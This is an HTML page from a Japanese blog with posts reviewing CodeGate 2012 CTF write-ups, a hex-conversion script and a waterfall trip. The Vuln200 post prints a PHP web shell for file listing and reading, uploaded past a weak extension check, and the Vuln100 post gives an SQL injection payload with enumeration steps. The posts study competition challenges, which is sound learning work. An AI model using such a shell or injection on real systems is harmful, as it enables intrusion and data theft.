+<p>せっかく作ったので、時間があれば複数文字コードに対応（最低限shift-jis, utf-8）とかしてみたいなぁ・・・。と思ってます。あとオプションで表示形式をもうちょっと詳細に指定できたらいいかも、とか考えてます。</p>
+
+<p>というか、これ使わなくてもコマンドライン一発でできるコマンドが既にあるなら誰か教えてください（笑）これ、スクリプト名も最初は「16進数に変換したい」って思ったからこの名前にしたんですが、10進も出力してるので名前変えたほうがいいですね・・・。</p>
+
+<p><a href="https://github.com/KentaKomai/warehouse/tree/master/convertStringToHex">こちら</a>で公開しています。よろしくです。</p>
+
+<p>2013/02/21追記</p>
+
+<p>facebookでご指摘いただき、python3系にも対応しました。まぁprint文を関数で呼び出すだけなんですが・・・ありがとうございました。</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/19/wordpress10/">CodeGate2012 Vuln200のwriteupを読んでみる</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-19T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>CodeGate2012の復習とかやっていきます。</p>
+
+<p>今回は出場者向けの内部ネットワーク内で稼働しているWebアプリケーションが対象なので、いつも参考にさせていただいているwriteupのブログを理解するまで読んで、記録しておく感じになります。（自分では部分的にも解いていません）</p>
+
+<p>今回は画像をアップロードするWEBアプリケーションみたいです。</p>
+
+<p>画像を選択して&#8221;Upload&#8221;ボタンを押すだけ。今回はフォームのバリデーションに脆弱性があります。.jpgの拡張子をチェックしていますが、.の後にjpgさえあればバリデーションを通過してしまいます。つまりhoge.jpg.phpといったコードをアップロードしたりできるみたいです。こういった問題は、問題を解くだけでなく、開発者的にも勉強になりますね。今回ネタさえ解れば、結構すぐに解けてしまう問題みたいなので、様々なwriteupにある手法を全てチェックしていきます。</p>
+
+<p>読ませていただいたwriteup</p>
+
+<ul>
+<li><span style="line-height: 1.714285714; font-size: 1rem;"><a href="http://leetmore.ctf.su/wp/codegate-2012-quals-vuln-200/">http://leetmore.ctf.su/wp/codegate-2012-quals-vuln-200/</a></span></li>
+<li><span style="line-height: 1.714285714; font-size: 1rem;"><a href="http://eindbazen.net/2012/02/codegate2012-vuln-200/">http://eindbazen.net/2012/02/codegate2012-vuln-200/</a></span></li>
+</ul>
+
+
+<p>ここで次のコードをアップロードし、実行してみます</p>
+
+<pre class="lang:php decode:true">&lt;?php 
+if ($_GET["d"])
+    print_r(scandir($_GET["d"]));
+if ($_GET["f"])
+    echo highlight_file($_GET["f"]);
+?&gt;</pre>
+
+
+<p>これを実行させることによって、任意のパスのファイルやディレクトリの一覧やソースコード取得できてしまいます。$_GET[&ldquo;d&rdquo;]とか$_GET[&ldquo;f&rdquo;]に自分が見たいディレクトリやファイルのパスを入れて実行してみます。</p>
+
+<p><a href="http://php.net/manual/ja/function.scandir.php">php scandir()メソッド</a>(引数のディレクトリの中身の情報を出力)</p>
+
+<p><a href="http://php.net/manual/ja/function.print-r.php">php print_r()メソッド</a>（配列を一気に出力）</p>
+
+<p><a href="http://php.net/manual/ja/function.eval.php">php highright_file()メソッド</a>（ソースコードを実行せずにテキストとして出力）</p>
+
+<p>どうやって特定したのかは不明ですが、対象システムはWindows Serverであるようなので(特定できなくても最低限LinuxとWindowsServerどっちも試してもそこまで時間はかからないと思いますが)以下のURLにアクセスします。$_GET[&ldquo;d&rdquo;]の値としてc:\usersを入れているところに注目です。</p>
+
+<p>**<a href="http://1.234.41.9/1olOI01/images/c6f8%E2%80%A64d81.php?d=c:\users**">http://1.234.41.9/1olOI01/images/c6f8%E2%80%A64d81.php?d=c:\users**</a></p>
+
+<p>これによってシステム内のユーザディレクトリ一覧が取得できますね。出力されるのが以下です。</p>
+
+<pre class="lang:default decode:true">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; All Users [3] =&gt; Default [4] =&gt; Default User [5] =&gt; Public [6] =&gt; codegate2 [7] =&gt; desktop.ini [8] =&gt; test )</pre>
+
+
+<p>codegate2とtestが怪しいですね。見てみます。</p>
+
+<p>**<a href="http://1.234.41.9/1olOI01/images/c6f8%E2%80%A64d81.php?d=c:\users\codegate2\desktop**">http://1.234.41.9/1olOI01/images/c6f8%E2%80%A64d81.php?d=c:\users\codegate2\desktop**</a></p>
+
+<pre class="lang:default decode:true">Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; APMSETUP Monitor.lnk [3] =&gt; Codegate 2012 Key.txt [4] =&gt; desktop.ini )</pre>
+
+
+<p>おー！Codegate 2012 Key.txtというファイルを発見！最後に</p>
+
+<p>**<a href="http://1.234.41.9/1olOI01/images/c6f8%E2%80%A64d81.php?f=c:\users\codegate2\desktop\Codegate%202012%20Key.txt**">http://1.234.41.9/1olOI01/images/c6f8%E2%80%A64d81.php?f=c:\users\codegate2\desktop\Codegate%202012%20Key.txt**</a></p>
+
+<p>今度は$_GET[&ldquo;f&rdquo;]としてファイルの内容を出力するようにURLを調整しています。</p>
+
+<p>これでkey取得</p>
+
+<pre class="lang:default decode:true">&lt;? 
+/* 
+Good Job ! 
+
+Key is 16b7a4c5162d4dee6a0a6286cd475dfb 
+*/ 
+?&gt; 1</pre>
+
+
+<p>答えは　16b7a4c5162d4dee6a0a6286cd475dfb　となります。</p>
+
+<p>これが自分が読んだ中で最もシンプルな解決方法でした。</p>
+
+<p>&nbsp;</p>
+
+<p><a href="http://php.net/manual/ja/function.eval.php">php eval()メソッド</a></p>
+
+<p>&nbsp;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/18/wordpress9/">CodeGate2012 Vuln100のwriteupを読んでみる</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-18T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>CodeGate2012の復習とかやっていきます。</p>
+
+<p>今回は出場者向けの内部ネットワーク内で稼働しているWebアプリケーションが対象なので、いつも参考にさせていただいているwriteupのブログを理解するまで読んで、記録しておく感じになります。（自分では部分的にも解いていません）本当はforensics500を解いてから、と思ったのですが、難しすぎてwriteup見ても時間かかりそうだったので、先にVulnをチェックしてみることにしました。</p>
+
+<p>いつもはリンク貼ってなかったけど、様々なところからリンク貼りまくりっぽかったので、僕も紹介します。</p>
+
+<ul>
+<li><a href="http://eindbazen.net/2012/02/codegate-2012-vuln-100/">http://eindbazen.net/2012/02/codegate-2012-vuln-100/</a></li>
+<li><a href="http://leetmore.ctf.su/wp/codegate-2012-quals-vuln-100/">http://leetmore.ctf.su/wp/codegate-2012-quals-vuln-100/</a></li>
+</ul>
+
+
+<p>こちらの記事にあるwriteupを読ませていただいて、自分のなかで消化します。どちらも上位チームの方々のブログです。</p>
+
+<p>まずはいつもどおり問題文と意訳（短いですが）</p>
+
+<blockquote><p>What is Administrator listening to the music?<br/>
+Service: <a href="http://1.237.174.123:3333/">http://1.237.174.123:3333/</a></p>
+
+<p>管理者が聴いてる音楽はなんでしょうか？アドレスは<a href="http://1.237.174,123:3333/%E3%81%A7%E3%81%99">http://1.237.174,123:3333/%E3%81%A7%E3%81%99</a></p></blockquote>
+
+<p>URLへ飛ぶと、ユーザが音楽をアップロードして、聴くことができるオンラインのミュージックプレイヤーアプリらしいです。自分自身のIPアドレスからアップロードした音楽のみを視聴することができる仕組みです。</p>
+
+<p>まず最初に、サービスを使ってみる。</p>
+
+<p>フォームに入力する（選択する）値は、mp3ファイルへのパス、ジャンル、タイトルの３つです。アップロードするフォームを利用したり、curlコマンドを使ったり。</p>
+
+<p>ファイルの最後に .mp3　がないとalert(&#8216;uplod mp3 file only&#8217;)というエラーが返ってくるということがわかりました。</p>
+
+<p>入力値はそれぞれ、mp3へのパスとタイトルは文字列として、ジャンルは数字で送信しています。そこから以下のSQL文を推測します。</p>
+
+<pre class="lang:default decode:true">INSERT INTO foo (mp3, genre, title) values ("filepath", NUMBER, "musictitle");</pre>
+
+
+<p>ジャンルの値に、SQLインジェクションを試みてみます。burp suiteやcurlコマンド、スクリプトなどなんでもいいので、genreのvalueを書き換えて送信します。</p>
+
+<pre class="lang:default decode:true">3,(SELECT 123+123)) --</pre>
+
+
+<p>フォームの下に、246とSELECT文の結果が表示されているのが確認できたので、genreの値にSQLインジェクションが可能なことがわかります。ここに、任意のSQL文を実行できる脆弱性があるので、データベースの情報を収集していきます。</p>
+
+<p>writeupに書かれたまま翻訳しているだけなので、手順だけ書くと</p>
+
+<ol>
+<li>information_schema.schemataからデータベース名を取得</li>
+<li>information_schema.tablesからデータベース名を条件にテーブル名を取得</li>
+</ol>
+
+
+<p>これで、テーブル一覧が取得でき、そこから&#8221;upload_mp3_[ユーザのIPアドレス]&#8220;の形式でテーブルが作成されていることがわかります。（ユーザごとに１つのテーブルが作成されている、ということ）</p>
+
+<p>テーブルのリストを見ると、Administratorのテーブルは、おそらく&#8221;upload_mp3_127_0_0_1&#8243;だと予想がつくので、</p>
+
+<p>information_schema.columnsからテーブル名を条件に、カラム名を取得するとidx,genre,title,fileの４つのカラムが定義されていることがわかります。</p>
+
+<blockquote><p>TODO: information_schemaに関しては、ちょっと調べてまとめてみようと思います。主要データベースのこういうのは知ってないと論外になりそうですね・・・。</p>
+
+<p>TODO: 文字列を標準入力で受け取って16進数を返す、それだけのスクリプト、あると便利かも。探してなければ書いてみます。</p></blockquote>
+
+<p>あとはupload_mp3_127_0_0_1テーブルからfileカラムの値持ってくるだけですね！データのbinaryがまんま入ってるみたいです。そこからデータ持ってきて、再生すれば、キレイな声のお姉さんが答え教えてくれます。むーん・・・自分が最初からチャレンジしてたらできたかなぁ・・・100の問題でも十分に難しい・・・・。</p>
+
+<p>今回writeupを読んで勉強になったこと。</p>
+
+<ol>
+<li><a href="http://dev.mysql.com/doc/refman/5.1/ja/information-schema.html">mysql information_schema</a>について</li>
+<li>SQLインジェクションが可能かの判定と、INSERT文へのSELECT文挿入</li>
+<li><a href="http://sitearo.com/cocoa/0800_internet/curl/">curlコマンドの使い方</a>(manコマンドで確認するとより詳細が確認できます)</li>
+<li><a href="https://github.com/hellman/quickhttp">python quickhttpモジュール</a></li>
+<li>SQL ORD関数、SUBSTR関数</li>
+</ol>
+
+
+<p>以上です。次はVuln200の問題のwriteup読んでみたいと思います。</p>
+
+<p>今年のCodeGateはWeb問題が追加される、とのことだったので、こういう問題は要チェックかもしれません。</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+  
+    
+      <h1 class="entry-title"><a href="/blog/2013/02/18/wordpress8/">滝行のチャレンジしてみた</a></h1>
+      
+      
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-02-18T00:00:00+09:00" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>17日（日）に神奈川県南足柄市にある夕日の滝、というところに学校の友人５人で行って来ました。</p>
+
+<p>前日の９時ごろから鶴見の友人宅にお邪魔し、次の日８時から出発、東名高速道路を使って10時くらいに現地到着しました。<a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/photo.jpeg" rel="image_group"><img class="alignnone size-large wp-image-84" alt="photo" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/photo.jpeg?resize=625%2C468" data-recalc-dims="1" /></a></p>
+
+<p>これが出発すぐの頃の友人。まるで旅行気分。僕もおかしつまみながら音楽かけてノリノリでした。この先想像を絶する苦行が待っているとも知らずに。</p>
+
+<p>現地の指導員の方との待ち合わせは10時半だったので、ちょっとだけ下見をすることに。</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011164-copy.jpg" rel="image_group"><img class="alignnone size-large wp-image-87" alt="_0011164 copy" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011164-copy.jpg?resize=625%2C468" data-recalc-dims="1" /></a></p>
+
+<p>寒さで雫が凍って、雑草がキレイなオブジェにｗｗｗ<a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011169-copy.jpg" rel="image_group"><img class="alignnone size-large wp-image-88" alt="_0011169 copy" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011169-copy.jpg?resize=625%2C468" data-recalc-dims="1" /></a> <a href="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011162-copy.jpg" rel="image_group"><img class="alignnone size-large wp-image-86" alt="_0011162 copy" src="http://i1.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011162-copy.jpg?resize=625%2C468" data-recalc-dims="1" /></a>自然がいっぱい！気温は３度！水温２度！！！</p>
+
+<p>&nbsp;</p>
+
+<p><a href="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011148-copy.jpg" rel="image_group"><img class="alignnone size-large wp-image-89" alt="_0011148 copy" src="http://i0.wp.com/tamago.servehttp.com/blog/wp-content/uploads/2013/02/0011148-copy.jpg?resize=625%2C833" data-recalc-dims="1" /></a>こちらが今回修行をつけてくれる夕日の滝、写真だと大きさ伝わりづらいですが、高さ23m幅5m程度です。少し手を入れてみたら、マジで冷たい・・・もっと写真撮ればよかったなぁ・・・ちょっと授業始まっちゃったんで、滝行レポはまた後で・・・とりあえず投稿・・・</p>
+
+<p>&nbsp;</p>
+
+<p>&nbsp;</p>
+</div>
+  
+  
+
+
+    </article>
+  
+  <div class="pagination">
+    
+      <a class="prev" href="/blog/page/8/">&larr; Older</a>
+    
+    <a href="/blog/archives">Blog Archives</a>
+    
+    <a class="next" href="/blog/page/6/">Newer &rarr;</a>
+    
+  </div>
+</div>
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/11/28/wordpress77/">簡易プロセス死活監視プログラムをc#で</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/25/wordpress76/">xv6のソースコードとテキストを読んでみる1_chapter0_2</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/19/wordpress75/">[CSCamp CTF]解けなかった問題forensics1のwriteupを読んでみた</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/18/wordpress74/">Vagrant + Chef solo + Berkshelfを試してみたのでまとめ</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/10/wordpress73/">xv6のソースコードとテキストを読んでみる1_chapter0_1</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2013 -  Kenta Komai <br/>
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> + <a href="https://github.com/ioveracker/mnml">mnml</a>.
+	  
+  </span>
+</p>
+
+</footer>
+  
+
+
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) {return;}
+  js = d.createElement(s); js.id = id; js.async = true;
+  js.src = "//connect.facebook.net/en_US/all.js#appId=212934732101925&xfbml=1";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
